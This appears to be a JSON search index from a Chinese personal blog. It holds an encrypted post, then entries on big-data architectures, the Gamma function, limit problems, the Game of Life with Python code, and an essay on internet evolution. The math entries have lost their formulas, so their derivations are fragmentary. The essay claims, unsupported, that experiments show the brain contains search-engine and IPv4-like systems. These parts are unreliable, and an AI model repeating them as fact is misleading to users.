7e5f18e94374c35cde08abdc387859b9bcabe0a1e9452429512b9d63acfe92b45632ec3b73cff733376ac5b83d3f890d1c9cc56915d6e2e9909e563ffaf04d78b6b1dd40dfbd6b5a0b59d59164117bb36083470dd84a917342654b3141e9533365746f0f0b5697163e1cc919eeb0d2e5b1569fd24e830755d00c6735879d79e20d8006ade7abfd136a2ab004a2a8cbc1fda98ece610bd11472ebc797eef1a7daf25cf98e5630b9b2093513d2e0780263a917b8be4255146487345996e4aab69a81af6c98492e8ae32d05be7bf74cdd66a9081b368a748ce723d46fedcd6e275af0dc728caf623fa676756e100087eee89e05c71e168e7e8ff672124abfe09918a903d08d4fd0163135364e4c07f852700b35544925624b37f854863c7491090d617111fc5b0d3ff8fe77654fe57b7d4a6c7cda697281f3effb22e5478209dba21854a2deaeffa5b5e4f5630e752a44c1318190ae20e712bdccda500997bcb4fb952bd9e827c3e0cf754fdc361dc51990bc5f97d58ed9f3a971651846ecaefe98f3795c120d5227c2fa49698bc49ed9fe1b3fb8ca1575992c313405cf9b6f04bc7c712720293d950cf33345a372628b4e38a9f818ff5e47135e3d0d57187eba480fb4bb5f904d0bbd2efdfd223260ba57eeae18223ba41ad711723304277a39434c4e26d43a12726a93a85b9e1800de4f0bd0d0278b5fae9ebcc210c6652782f08f45ad65f8064048065e9f2a09656b9d07689417f49fc5f1d4c1c35f83477a6988c66a7652453aa2982374aadb93dbb87dbb3caa9539678732bb803400ee8cf5c9cf76ec8ee84315b9d6bb04d2f94a6e1bba2d73ea9306b8deabfa497d0cc79c03a17c78020664001e76e9c55e96288988dbbd2a3155ec2e7e2c666b403735a0041ed5f74fa45fd7668d4f9a49a4c6515f7a14b1c53fa1bbcc633901fd0694882cb48292d9a902555d2d788adf91582177b493bd06b31ff314c186496b8e35f5446f6b6e779cc1b57398516797e901d6c5c86752085e088fe7173803238f4c54c81e35fcbd53e9115b332107154863f5985e568db128fb8fe6ad6ea41098d0bfd93cc05d950703bb02956072ad870cb2f09db550f98a1cb4fc9db5621c3cc57ac7f51388a5fe04269ddb6b94c6120a5877b2642ada5530e83ec48e1158aaac9017892573d0701bd4d41f13160e6b3af366bafea123bb2b79a3b9709c0b61da27bd4e1b1a5eaf9920bd326b7169f879914404c7b47ef3103b9d647a8eb65f283c0626dc3b1b00288bd283952a0d43718549e25f072bdbae7df5dddd8443b2ad271f82edf973dd4ef87d63ff4ad33cf8659755ab4689968e1100f2b76b5c22ee4975b3b28f18e65084603a464616e7e602425ab187de58df183b2755db754dcde0e0d0ca67e61fd366188bca49ff6ae72dcb6f66fa6b4816dfe42329e84955bfa2e2f988f54550e90b06b8eb3b83dcc0ec710f31ff873c1e54c2acb55748becc90ad03f6679bbb3c0e4128462ae1813a6a90f57fd078ce32670c2570021c70d66c8f6fb80521c7240f2825158c1534fa8e2daa213e45c99685532ed6324de8af9e4c2a472a9a5509816f731768ca457162f3e419765fc33bb0769b100748828a16a879aa0fd0fad9850970f15d2348122dab472cba74532cb2eefb2bf02e1dd5796ee7ecfe508b2b025efb1ec785e4f2a6f53c51b38c119d882c873da819e0f726b08b32abeab7486138d860e031758ead5b6333e45344871d2e50b0c73d956ca47a7a68db37a72577dc7b84fa9ed26deee7b7d9d1e816e56e6269c41650bba367122bc6a0e89e29c2ce2fe2d15e20ed0182f33b2e90776a62177b4b5128fa0b71f48bf488433ded64ba6d7c3e45bbfe3c4c10b5330cd4156604b487395a9bfceeea90f5b48451c3fc7a4210167528de54216a94b6711bec3c843485f8459f7b7167087b05e26acf29f05617c2d25980a41bf46b9d19751cf268418393e15ca529c7151ac72b454fe174c5b29e21d18a54405c1b0f15413e90b79d91f25a3cc9f705f5db2b46f22d9af83ccfee441d3a37f67159d6a7df1a83d34039051a5025088a18a4bbc9727fddc6449e9b52e188fddd99e2697479dbc1a125987e84b63451ccb99d94a774c900df74f2de363ac6caab779fcd4aa17e8af9bd4916ab78086279d60c8bc892976658f065e0404abd333769ac3a2a00e031f6cce38b274ac83a0440e11c01eea80e5e4950cbfe05c09e91d56c72bb6bc8e7fb7d7701409b68ff39b86a666239f56d5999c9de24953c2beba667aa90f038e2f68e386b22daf3f95599f7a1265f0001bce49b8e04511398c5aebf51c6861bfa8fcc7b1f53ae995a485342e046192c6dfb60946d3edf73f0229c954d59f76e75bf7bc7f6a7e0a13ce8713f2f9fa8551b4b1ec3107308a0aa93d8a7adf8d28a30031472c4971413809779b25e6eaf1f98d19c1746339ba30098c6ee291a2a8f331164801b571852201ce88f73683fb0c7a618567c22c8e73af482f11b259193f6593558a5b29e11d088b12cf4d3c7e878fd315e5d68195b7aa238f0d7ba2feae27b893dad1850978ee7a4a643027c408d0f6bb071ff1b9ba70c47ea01082a0206d2a3b27d4d87d7b21f57ca80b68ab68e0925e9e642a00c00e8697b867dddbb190f2f14b93451f735b224813daa1c8541caa8cb828f7c4b522a1ad3749aea7a0acaaf614e59ece760ebdc8af792febec807991be451b87d37254d829b35b6c91404f4c5d453960f7ebf9740eb0052c7dc3ddd88ce10b81a64453f9dc8360eb6fba83a1c3fc1030fe5c6a3a9847c8d99b40a7ddc80e83776cec6f7eb563e6564e3b4a4954d42b901072628dffb62252607c1a298f9cbfd3cd35b5ad16b3cb8ff6f3ec10943f50f89deffc72dd5ad9b09d3b031670be98be704353495dd2ea554f596d98c7ef151abd41267037a6cff7a1ef33ece524668a3887af653e0c446de222b24e85b57558c215cb5f918e6d5cd18bdd1d87227a63b823687d6c679dbf69bd88027757767ac7cf06ab663b4086537bcbf7dc6142e7957ed74737ede2dfcd305c5478df3808244768d922e521a8e5fc109bb70adeea2e4168cbba7002bb968da28c451bd238f6a2775484e195e0a1dabef0ddf6479cfa67614a03aa23237d3ec019f4d09997913d04ea94a3fef1fc1ffb47089b7f7d7fc8976639bb1779fdaa12c2768cc958480b7f153d9eb7426364d60e5f83fe43fa7a6f35e07b06067f7d5fc58f1c14ede419686728671e08a731ce8e4b865e07b7fba37f76a06ffa73a292f16f1f7c6264dac1148f1b6d0f00273b60b0e38f9a68512fde8d3a5902b23e67eab41b0e9a90d96519c2f23a80f6f3cf9eb7bea173a37f1bede6b43cfe4d52c875107121c1408ee381b668435003356b1b01c76491192f77816ece64a304efa0a83b0d2661d04b2950b6f8fb7ee7f6b04948ac16f9362f42167adec51c4eea5b16815f062c1b2442ab76fa6a8bed68fd0d1e5f19fc39a18401302fde9a006add9b3a88fc460f325302baac6805932cab8ed0de233ac83ab6243bc1d6b27476947cd7a032a050ffa7982f0b9c298749f7b4cde312fbce6098778a9912aa36b9cd37b51ed0a2fc29200eb222a76699204cff3448416fc41e06eb8bf6995ffe36fb8a522029b0ddacb013edc29f20c366afa12b9e00c455ea4c0e51b19cfa92674c0a44cc5a666dfdd47a66b1de340d9deca420c5ce58a96fbda3508ba6db4104462a1ac280a6fda0c04942f098b40083cb52ccd1021e38aa89951d5a6e2e9a338dfcbbc26ae6601a65f569ae5ead9ffd0b1a467d7837783d1fe0a6ec1bae32abaae56f2532d16404626da0d48df201a86b81566c88df253f098fd7c563ade3967c97129741bd5e06dc10cf6c4db3cb62e3e387aa54a864843fe545080d24f305027551a51ec279feec90997aa0550de291e01559e747ca3c65170252470e91bdcf70df04ee6845358949cb115231690cd1aeb80a66e98c72750003379d80fb6f19543f16bc1e53f912470764ef70f81641e4ca9d3fb079f9b454716c8a2d6e80d9720601a3ef33f4d3f3307d3915a0eb3dc85df9b8c22a58713f2d3dad55259f0e41d59f545ec49a7a6eb3464e5557623eb8cb743d05ade0bef76f5547a31f251c5da32d872f6a5957714e18a64a113d4a3fe726b42beeda0318fa27a887535815afe393c03e3e3e1d625a97e66c37978fae1afc5389840abe3d830f9f63a1116962656156ea471e2c442b26e8d0ef8a666bf363e0f13aa7956a9e83ca9a2d7d7cc3f6ddd1c07680abed6149e84c078c843fdf2dbd9e1b2011043f6d654fa862890aa0c585f3bd2c382727759bd136dd23d4d3e51d92662e79934a7b1f57c75ff51c84690df0b58899202482b14cf0aecab75fef73f55e3e33387f4c3928d152261bea246e2e2a8ca5933a6fc154ed2cf23aa7172dfa1a55470b7b7b0d9256618d0ca8a1f3d8f1f6dcdab9dfd15cf37a800d41c686b42cf95b2a2898ed49e5323a094770c5359de4cc74925905ba483a20f51b1b49bec63a63219b0af02cfe60477428c765650a265ceb2e8dfed4e618d73a3a1eb0056b2d06c17f70b934374c3312e3d4991ae994fe3cdefe78c3a4013ecac33c36f2bdeabf35aa2e80d98fd22eabbcdf3cafde0f8181157dc31449b9d0a131f75b335a750aa1c5a7a35e1c06cd644e3ea6b7b2c77a604ba27f142eb5ce3472a21abc8ca5461e8cb01b3f334cccad07a77a4235cf62a70fdc69fe956535a8dc025696d3e8bcb093da435be5a742158e8aacd842fc5dc5311d90084d807c4d1e12225f14bfadec72ea7bfee007ce461f611c9bbbc8398a43445724f207fbbf39ad25f40b81d0ce9befc9dd6a31819ea4e1e4b67b3c4281da3dd4d07ce4dfd756236a4beea08d3bd9ef5408a164be6ab1cd3ce5553e1804a0c40bc86ade6a99630f92edd92e83f75b0e4350e7183f4af0d34b5d01038d42060eb87b7c67dc05d3ee2adac2c5e94517face82362de748420a5 您好, 这里需要密码.","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.mhuig.top/categories/Web/"},{"name":"IPv6","slug":"Web/IPv6","permalink":"https://blog.mhuig.top/categories/Web/IPv6/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.mhuig.top/tags/Web/"},{"name":"IPv6","slug":"IPv6","permalink":"https://blog.mhuig.top/tags/IPv6/"},{"name":"加密备忘录","slug":"加密备忘录","permalink":"https://blog.mhuig.top/tags/%E5%8A%A0%E5%AF%86%E5%A4%87%E5%BF%98%E5%BD%95/"}]},{"title":"神秘数字 4.669","slug":"math/神秘数字4.669","date":"2021-02-10T01:50:47.000Z","updated":"2021-02-10T01:50:47.000Z","comments":true,"path":"p/373468cd/","permalink":"https://blog.mhuig.top/p/373468cd/","excerpt":"","text":"从无序迈向有序","categories":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"}],"tags":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"},{"name":"分形","slug":"分形","permalink":"https://blog.mhuig.top/tags/%E5%88%86%E5%BD%A2/"},{"name":"混沌","slug":"混沌","permalink":"https://blog.mhuig.top/tags/%E6%B7%B7%E6%B2%8C/"}]},{"title":"大数据架构演变","slug":"bigdata/大数据架构演变","date":"2021-02-07T12:51:06.000Z","updated":"2021-02-07T12:51:06.000Z","comments":true,"path":"p/7e3480e9/","permalink":"https://blog.mhuig.top/p/7e3480e9/","excerpt":"","text":"在 Hadoop 系列框架还没出现之前，数据分析工作已经经历漫长的发展，其中以 BI 系统为主的数据分析，已经有非常成熟和稳定的技术解决方案和生态系统，BI 系统的架构图如下： BI 又叫商业智能，其包括与传统业务系统的区别在于：业务系统更注重于事务型的数据处理，用来支撑企业的各业务线；而 BI 是将企业中所有数据汇聚成数据仓库（DW）并对其进行分析型操作，其中 Cube 是 BI 的核心模块。Cube 是一额更高层的业务抽象模型，在 Cube 上可以进行上钻、下钻、切片等操作、 BI 系统都是基于关系型数据库，关系型数据库使用 SQL 语句进行操作，但是 SQL 在多维操作相对较弱，所以 Cube 有自己独有的查询语言多维查询语言 —— MDX 大多数的数据库服务厂商都提供 BI 服务，轻易便可搭建出一套 OLAP 分析系统 OLTP 联机事务处理，表现为企业中的应用系统如 OA、CRM、ERP、财务软件等供各部门使用 OLAP 联机分析处理，也叫决策支持系统 DSS，通常进行使用者是企业高管或部门管理者 但是随着互联网发展，BI 系统也暴露除了一些缺点: BI 系统多以分析业务数据产生结构化数据为主，对于非结构化和半结构化数据处理乏力。例如图片、文本、音频的存储、分析。 随着异构数据源增加，要解析数据内容进入数据仓库，则需要非常复杂的 ETL 程序，从而导致 ETL 变得过于庞大和容易出错，需要大量人力进行维护 随着数据的增长，性能会成为瓶颈，在 TB / PB 级别的数据处理上表现的尤为乏力 数据仓库的原始数据都是只读的用来分析，不存实务操作者导致传统的范式约束大大影响了性能 由于 BI 的一系列问题，在以 Hadoop 生态圈的大数据分析平台逐渐表现出其优异性，围绕 Hadoop 体系的生态圈也不断变大，对于 Hadoop 系统来说，从根本上解决了传统数据仓库瓶颈的问题 随着大数据平台的不断发展，现在主要对数据的处理时效进行区分为 针对于 T + 1 数据的离线处理架构，其主要应用框架由 Hadoop、Hive、Sqoop 等组成 针对实时数据的流式处理架构，其主要由 Spark、Flink、Flume、Kafka 等组成 Lambda 架构“我们正在从 IT 时代走向 DT 时代 (数据时代)。IT 和 DT 之间，不仅仅是技术的变革，更是思想意识的变革，IT 主要是为自我服务，用来更好地自我控制和管理，DT 则是激活生产力，让别人活得比你好” —— 阿里巴巴董事局主席马云。 Hadoop 作为解决对大数据量低成本规模化的处理的解决方案被广泛应用 但是 MapReduce 或者 Hive 很难做到低延迟，用 Storm 开发的实时流处理技术可以帮助解决延迟性的问题，但它并不完美 Storm 不支持 exactly-once 语义，因此不能保证状态数据的正确性 Storm 不支持基于事件时间的处理 后来出现了一种混合分析的方法，它将上述两个方案结合起来，既保证低延迟，又保障正确性 ——Lambda Lambda 架构是由 Storm 的作者 Nathan Marz 提出的一个实时大数据处理框架 Marz 在 Twitter 工作期间开发了著名的实时大数据处理框架 Storm，Lambda 架构是其根据多年进行分布式大数据系统的经验总结提炼而成 Lambda 的目标: 高容错、低延时、可扩展 Lambda 特性 整合离线计算和实时计算 读写分离和复杂性隔离 可集成 Hadoop，Kafka，Storm，Spark，HBase 等 Marz 认为大数据系统应具有以下的关键特性（Lambda 架构的关键特性）： Robust and fault-tolerant（容错性和鲁棒性）：让系统从错误中快速恢复 Low latency reads and updates（低延时）：响应是低延时 Scalable（横向扩容）：通过增加机器的个数来提高系统的性能 General（通用性）：支持多领域的数据分析（金融、社交、电子商务等） Extensible（可扩展）：以最小的开发代价来增加新功能 Allows ad hoc queries（方便查询）：即时查询，快速简便的进行查询 Debuggable（易调试）：快速定位错误 Lambda 架构通过分解的三层架构来解决问题 Batch Layer Speed Layer Serving Layer Batch Layer理想状态下，任何数据查询都可以从表达式 Query= function (all data) 获得，但是若数据达到相当大的一个级别（例如 PB），且还需要支持实时查询时，就需要耗费非常庞大的资源 可以将数据提前进行计算处理成为 Batch View，这样当需要执行查询时，可以从 Batch View 中读取结果。这样一个预先运算好的 View 是可以建立索引的，因而可以支持随机读取 Batch Layer 总结为： Batch View = function(all data) Query = function(BatchView) Speed LayerBatch Layer 的离线处理可以很好的满足大多数应用场景，但有很多场景的数据是不断实时生成，并且需要实时查询处理。Speed Layer 正是用来处理增量的实时数据并生成 Realtime View Speed Layer 处理的数据是最近的增量数据流，Batch Layer 处理的是全体数据集 Speed Layer 为了效率，接收到新数据时不断更新 Realtime View，而 Batch Layer 根据全体离线数据集直接得到 Batch View Speed Layer 是一种增量计算，所以延迟小 Speed Layer 总结为： RealtimeView＝function(RealtimeView，new data) Batch Layer 和 Speed Layer 优点： 容错性：Speed Layer 中处理的数据也不断写入 Batch Layer，当 Batch Layer 中重新计算的数据集包含 Speed Layer 处理的数据集后，当前的 Realtime View 就可以丢弃，这也就意味着 Speed Layer 处理中引入的错误，在 Batch Layer 重新计算时都可以得到修正。这点也可以看成是 CAP 理论中的最终一致性（Eventual Consistency）的体现 复杂性隔离：Batch Layer 处理的是离线数据，可以很好的掌控。Speed Layer 采用增量算法处理实时数据，复杂性比 Batch Layer 要高很多。通过分开 Batch Layer 和 Speed Layer，把复杂性隔离到 Speed Layer，可以很好的提高整个系统的鲁棒性和可靠性 Query = function( Batch View , Realtime View ) Realtime View = function( Realtime View , new data ) Batch View = function( all data ) Serving Layer用于响应用户的查询请求，合并 Batch View 和 Realtime View 中的结果数据集到最终的数据集 Kappa 架构Lambda 架构有时会出现批量数据和实时数据结果对不上的问题 LinkedIn 的 Jay Kreps 提出了一个新的架构：KAPPA 它的理念是：鉴于大家认为批量数据和实时数据对不上是个问题，它直接去掉了批量数据; 而直接通过队列（Kafka），放入实时数据之中。 例如：将所有的数据直接放到原来的 Kafka 中，然后通过 Kafka 的 Streaming，去直接面向查询 该架构也存在着一些问题： 不能及时查询和训练。例如：我们的分析师想通过一条 SQL 语句，来查询前五秒的状态数据。这对于 KAPPA 架构是很难去实现的 面对各种需求，它同样也逃不过每次需要重新做一次 Data Streaming。也就是说，它无法实现 Ad—hoc 查询，我们必需针对某个需求事先准备好，才能进行数据分析 新数据源的结构问题。例如：要新增一台智能硬件设备，我们就要重新开发一遍它对应的适配格式、负责采集的 SDK、以及 SDK 的接收端等，即整体都要重复开发一遍 IOTA 架构IOTA 架构整体思路设定标准数据模型，通过边缘计算技术把所有的计算过程分散在数据产生、计算和查询过程当中，以统一的数据模型贯穿始终，从而提高整体的预算效率，同时满足即时计算的需要，可以使用各种 Ad-hoc Query 来查询底层数据 Common Data Model（核心）：从数据收集到数据存储和处理使用统一的数据模型 ​ “主 - 谓 - 宾”、“对象 - 事件”、“产品 - 事件”、“地点 - 时间” 模型等等 ​ 例，“X 用户 – 事件 1 – A 页面（2018/4/11 20:00） SDKs：数据的采集端，不仅仅是过去的简单的 SDK，在复杂的计算情况下，会赋予 SDK 更复杂的计算，在设备端就转化为形成统一的数据模型来进行传送 Real Time Data：实时数据缓存区，这部分是为了达到实时计算的目的，海量数据接收不可能海量实时入历史数据库，那样会出现建立索引延迟、历史数据碎片文件等问题。因此，有一个实时数据缓存区来存储最近几分钟或者几秒钟的数据。这块可以使用 Kudu 或者 Hbase 等组件来实现。这部分数据会通过 Dumper 来合并到历史数据当中。此处的数据模型和 SDK 端数据模型是保持一致的，都是 Common Data Model，例如 “主 - 谓 - 宾” 模型 Historical Data：历史数据沉浸区，这部分是保存了大量的历史数据，为了实现 Ad-hoc 查询，将自动建立相关索引提高整体历史数据查询效率，从而实现秒级复杂查询百亿条数据的反馈。例如可以使用 HDFS 存储历史数据，此处的数据模型依然 SDK 端数据模型是保持一致的 Common Data Model Dumper：Dumper 的主要工作就是把最近几秒或者几分钟的实时数据，根据汇聚规则、建立索引，存储到历史存储结构当中，可以使用 map reduce、C、Scala 来撰写，把相关的数据从 Realtime Data 区写入 Historical Data 区 Query Engine：查询引擎，提供统一的对外查询接口和协议（例如 SQL JDBC），把 Realtime Data 和 Historical Data 合并到一起查询，从而实现对于数据实时的 Ad-hoc 查询。例如常见的计算引擎可以使用 presto、impala、clickhouse 等 Realtime model feedback：通过 Edge computing 技术，在边缘端有更多的交互可以做，可以通过在 Realtime Data 去设定规则来对 Edge SDK 端进行控制","categories":[{"name":"BigData","slug":"BigData","permalink":"https://blog.mhuig.top/categories/BigData/"}],"tags":[{"name":"BigData","slug":"BigData","permalink":"https://blog.mhuig.top/tags/BigData/"}]},{"title":"离散世界与连续世界的联系","slug":"math/离散世界与连续世界的联系","date":"2021-01-02T12:34:44.000Z","updated":"2021-01-02T12:34:44.000Z","comments":true,"path":"p/2b995a0c/","permalink":"https://blog.mhuig.top/p/2b995a0c/","excerpt":"","text":"探索当年，哥德巴赫异想天开就想离散的世界的阶乘能不能用连续世界的积分来表达。 哥德巴赫有个好朋友叫伯努利，伯努利有个学生叫欧拉。欧拉有个学生叫拉格朗日，拉格朗日有个学生叫柯西 哥德巴赫与伯努利交流，问伯努利：有没有离散世界和连续世界可以相等的呢？ 伯努利想不明白，就问他的学生欧拉，然后欧拉一晚上想出来了。故事结束 伽玛函数 换元，令 则 推导建立递推式 由于 得到： 当 时, 当 时, 如： 又如： 数学归纳可得： 参考文献Γ 函数 wikipedia","categories":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"}],"tags":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"}]},{"title":"一大波题目正在来袭","slug":"math/一大波题目正在来袭","date":"2020-12-06T13:33:18.000Z","updated":"2020-12-06T13:33:18.000Z","comments":true,"path":"p/bc43343e/","permalink":"https://blog.mhuig.top/p/bc43343e/","excerpt":"","text":"","categories":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"}],"tags":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"}]},{"title":"回顾几个有趣的小题目","slug":"math/回顾几个有趣的小题目","date":"2020-11-16T13:08:56.000Z","updated":"2020-11-16T13:08:56.000Z","comments":true,"path":"p/ce5b71c0/","permalink":"https://blog.mhuig.top/p/ce5b71c0/","excerpt":"","text":"One 设 ,满足 , . (1) 证明存在，并求其值。 (2) 求. 我们称 叫做递推式，也叫迭代式。 上一步的函数值是下一步的自变量，如此循环往复。 迭代过程： 绘制图像 相当于在两条曲线的夹缝中求生存，最终的极限值趋近于 0. 数列、、到、单调减少，且有下界 0. (1) 用数学归纳法证明有界. 1. 验证 . 2. 设 . 3. 则 . 于是有下界 0. 且显然 . 由单调有界准则,存在, 记为 . 由 ,得 ,解得 ,于是 . (2) . 由于 存在，由归结原则: . Two (1) 证明方程 在 内有唯一实根； (2) 对于 (1) 中的，任取 ,定义 , 证明 . 是超越方程，只能求得数值解，不能求得解析解，交点就在那里，可是就是不知道它是几. 相当于在两条曲线的夹缝中求生存，最终的极限值趋近于. 数列、、到、单调减少，且有下界. Three 设 , , ,证明存在且其极限是方程 的根. 是超越方程解不出解析解，交点就在那里，可是就是不知道它是几。 (1) 证 在内有唯一实根。 令 ,则 , . 且 . .单调递减. . 唯一 (2) 证 . 构造 . 由拉格朗日中值定理: 数学归纳 由于 故连续放缩得 于是 且 有界. 故 . . 即 Four 设 , , , .若存在，求的取值范围.数学归纳 1. . 2. 设 . 3. 则 单调增加。 若存在，记为 . 于是有交点. 函数值相同导数值斜率相同 故 时,有交点. 又 时, 2. 设 3. 则 . 有上界. 综上，当 时,存在，且值为 的根. [注] (1) 当 时，有 2 个交点. eg. 当 时， ,. (2) 当在怎样的正数取值范围内取值时，曲线 和直线 必相交？ 曲线 和直线 相交的充要条件是存在 ，使得 ,即 即属于 的值域. 由于 =0. 故只需求出的最大值则的取值范围就是. 可得 唯一驻点. 当 时 ,当 时 , 时为在 内的最大值. 由此，曲线 和直线 相交的充要条件是满足 .","categories":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"}],"tags":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"}]},{"title":"宇宙的本质是计算","slug":"pen/宇宙的本质是计算","date":"2020-11-06T00:35:48.000Z","updated":"2020-11-06T00:35:48.000Z","comments":true,"path":"p/92a4ae9/","permalink":"https://blog.mhuig.top/p/92a4ae9/","excerpt":"","text":"如果认为物理学家的任务是发现自然是什么，那就错了，物理学家关心的是我们关于自然能说点什么。 —— 尼尔斯・玻尔 想象一下，一望无际的大平面被分成了许许多多方格子。每个格子里正好能放下一个 “细胞”。这个细胞不能运动，它可以是死的，也可以是活的；但它的状态，是由它周围 8 个细胞的死活决定。 规则至于决定的规则，在这个例子里只有这么几条： “人口过少”：任何活细胞如果活邻居少于 2 个，则死掉。 “正常”：任何活细胞如果活邻居为 2 个或 3 个，则继续活。 “人口过多”：任何活细胞如果活邻居大于 3 个，则死掉。 “繁殖”：任何死细胞如果活邻居正好是 3 个，则活过来。 产物而下面这几张图，全是遵循这几条简单规则的产物。 \"脉冲星\"它的周期为 3，看起来像一颗周期爆发的星星。 “滑翔者”每 4 个回合 “它” 会向右下角走一格。虽然细胞早就是不同的细胞了，但它能保持原本的形态。 “轻量级飞船”它的周期是 4，每 2 个回合会向右边走一格。 “滑翔者枪”它会不停地释放出一个又一个滑翔者。 “繁殖者”它会向右行进，留下一个接一个的 “滑翔者枪”。动图最后一帧定格时用三种颜色区分了繁殖者本体、滑翔者枪和它们打出来的滑翔者。 Game Of Life上面这几条规则别名 “生命游戏”，可能是最出名的一套规则组。 最早研究细胞自动机的科学家是冯・诺伊曼，后来康韦发明了上面展示的这个最有趣的细胞自动机程序：《生命游戏》，而 wolfram 则详尽的讨论了一维世界中的细胞自动机的所有情况 这个游戏被许多计算机程序实现了。Unix 世界中的许多 Hacker 喜欢玩这个游戏，他们用字符代表一个细胞，在一个计算机屏幕上进行演化。 import numpy as npimport matplotlib.pyplot as plt class GameOfLife(object): def __init__(self, cells_shape): \"\"\" Parameters ---------- cells_shape : 一个元组，表示画布的大小。 Examples -------- 建立一个高20，宽30的画布 game = GameOfLife((20, 30)) \"\"\" # 矩阵的四周不参与运算 self.cells = np.zeros(cells_shape) real_width = cells_shape[0] - 2 real_height = cells_shape[1] - 2 self.cells[1:-1, 1:-1] = np.random.randint(2, size=(real_width, real_height)) self.timer = 0 self.mask = np.ones(9) self.mask[4] = 0 def update_state(self): \"\"\"更新一次状态\"\"\" buf = np.zeros(self.cells.shape) cells = self.cells for i in range(1, cells.shape[0] - 1): for j in range(1, cells.shape[0] - 1): # 计算该细胞周围的存活细胞数 neighbor = cells[i-1:i+2, j-1:j+2].reshape((-1, )) neighbor_num = np.convolve(self.mask, neighbor, 'valid')[0] if neighbor_num == 3: buf[i, j] = 1 elif neighbor_num == 2: buf[i, j] = cells[i, j] else: buf[i, j] = 0 self.cells = buf self.timer += 1 def plot_state(self): \"\"\"画出当前的状态\"\"\" plt.title('Iter :{}'.format(self.timer)) plt.imshow(self.cells) plt.show() def update_and_plot(self, n_iter): \"\"\"更新状态并画图 Parameters ---------- n_iter : 更新的轮数 \"\"\" plt.ion() for _ in range(n_iter): plt.title('Iter :{}'.format(self.timer)) plt.imshow(self.cells) self.update_state() plt.pause(0.2) plt.ioff() if __name__ == '__main__': game = GameOfLife(cells_shape=(60, 60)) game.update_and_plot(200) 这个游戏可以在这里玩~ https://playgameoflife.com/ https://funnyjs.com/jspages/game-of-life.html 规律蝴蝶扇动翅膀，引起大洋彼岸的风暴。 简单的底层逻辑，导致了纷繁复杂的生命现象。 微观遵循简单的逻辑， 而宏观上会表现出纷繁复杂的现象。 如此简单的程序能生成如此复杂的行为，这意味着什么？沃尔夫勒姆认为，这正是我们宇宙的本质；我们的世界就是计算，是一套简单的规则生成的复杂现象。 附：xkcd 的一幅漫画。也许我们的宇宙就是细胞自动机的计算结果呢。 以上漫画译自 https://xkcd.com/505/ ，并以 Creative Commons Attribution-NonCommercial 2.5 License 许可证发布。 最后，漫画里有一格的背景是黑的，一个粒子上有两个（一样的）二进制数指着它。如果你计算一下它俩的十进制..... The Answer to Life，the Universe and Everything is 42. Why is 42 ? 请用 Python 或者其他高级语言执行一下类似如下命令&gt;&gt;&gt; ord('*')42简单地说，42 是*的 ASCII 码，*代表什么？就是Life, the Universe, and Everything啊.","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"互联网进化！","slug":"pen/互联网进化！","date":"2020-11-05T23:00:00.000Z","updated":"2020-11-05T23:00:00.000Z","comments":true,"path":"p/9feab2fa/","permalink":"https://blog.mhuig.top/p/9feab2fa/","excerpt":"","text":"简介《互联网进化论》书中提出 \"互联网的未来功能和结构将于人类大脑高度相似, 也将具备互联网虚拟感觉, 虚拟运动, 虚拟中枢, 虚拟运动神经系统\",并绘制了一幅互联网虚拟大脑结构图. 云计算是互联网的核心硬件层和核心软件层的集合, 也是互联网中枢神经系统的萌芽. 大数据代表了互联网的信息层 (数据海洋),是互联网智慧和意识产生的基础. 物联网, 传感器在源源不断的向互联网大数据层汇集数据. 疑问：互联网的进化显示生命进化的方向性达尔文进化论认为生物进化并不是从低级到高级的进化，进化没有预定的方向；生物进化是自然选择的结果。 达尔文进化论动摇了神学的土壤和基础，但互联网的进化却可能引发神秘但有趣的问题 —— 互联网和人脑为什么向同一方向进化？ 互联网的未来结构是人类的大脑结构，互联网的每一个创新都是对数万年前已经存在人脑功能的模仿。科学实验证明大脑中也经拥有 Google 一样的搜索引擎，Facebook 一样的 SNS 系统，IPv4 一样的地址编码系统，思科一样的路由系统。 40 多年来人类从不同的方向在互联网领域进行创新，并没有统一的规划将互联网建造成什么结构，但有一天人类抬起头来观看自己的产品，将发现这个产品与大脑的结构高度相似，而且可以作为揭开大脑之谜的钥匙。这是一个非常奇特的现象。 终极结论“看不见的手” 像幽灵一样盘踞在人类社会的发展过程中，时隐时现，如果说社会学、经济学还只是模糊的看到这只手的影子，那么互联网的进化有可能第一次把 “这只看不见的手” 逼到科学的解剖刀下。如何解剖它，那需要未来更多的研究者思考和实践，相信这个秘密的解开将会给人类带来重大而深远的影响 。 互联网，宇宙和大脑的关系是互联网进化论的终极结论：互联网将宇宙和大脑结合在一起，结构无限逼近人脑结构，空间上无限逼近宇宙边缘，在无穷时间点，宇宙，大脑，和互联网三者将合为一体，进化成为宇宙大脑或智慧宇宙。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"BERT 预训练模型及其应用案例","slug":"data-mining/BERT预训练模型及其应用案例","date":"2020-11-05T07:47:27.000Z","updated":"2020-11-05T07:47:27.000Z","comments":true,"path":"p/48f700eb/","permalink":"https://blog.mhuig.top/p/48f700eb/","excerpt":"预训练模型最开始是在图像领域提出的，获得了良好的效果，近几年才被广泛应用到自然语言处理各项任务中。 (1) 2003 年 Bengio 提出神经网络语言模型 NNLM，从此统一了 NLP 的特征形式 ——Embedding； (2) 2013 年 Mikolov 提出词向量 Word2vec，延续 NNLM 又引入了大规模预训练（Pretrain）的思路； (3) 2017 年 Vaswani 提出 Transformer 模型，实现用一个模型处理多种 NLP 任务。 (4) 基于 